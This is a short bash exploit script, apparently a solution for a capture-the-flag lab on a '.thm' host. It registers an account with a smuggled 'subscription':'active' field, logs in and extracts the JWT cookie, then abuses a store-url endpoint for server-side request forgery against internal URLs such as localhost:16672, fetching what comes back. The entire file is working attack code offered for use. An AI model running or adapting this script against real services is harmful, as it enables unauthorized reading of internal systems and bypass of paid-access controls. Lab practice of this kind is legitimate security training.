#! /bin/bash

OPTSTRING=":u:r"

REGISTER=false
URL="http://localhost:16672"

while getopts ${OPTSTRING} opt; do
  case ${opt} in
    u)
      URL="${OPTARG}"
      echo "URL: $URL"
      ;;
    r)
      REGISTER=true
      echo "Registration: ${REGISTER}"
      ;;
    \?) # handle invalid options
      echo "Error: Invalid option -${OPTARG}." >&2
      exit 1
      ;;
    :) # handle missing arguments
      echo "Error: Option -${OPTARG} requires an argument." >&2
      exit 1
      ;;
  esac
done

shift $((OPTIND - 1))

if $REGISTER; then
    # register
    curl http://storage.cloudsite.thm/api/register -X POST --json '{"email":"user@gmail.com","password":"Password123@", "subscription":"active"}' -v
fi

# login
JWT=$(curl http://storage.cloudsite.thm/api/login -X POST --json '{"email":"user@gmail.com","password":"Password123@"}' -v 2>&1 | grep 'Set-Cookie' | awk -F ":" '{print $2}' | cut -d ";" -f 1 | sed 's/^ //')
echo "JWT: $JWT"

# ssrf
UPLOAD_PATH=$(curl http://storage.cloudsite.thm/api/store-url -X POST --json "{\"url\":\"$URL\"}" -H "Cookie: $JWT" -s | jq '.path' | sed 's/"//g')

curl http://storage.cloudsite.thm$UPLOAD_PATH -H "Cookie: $JWT"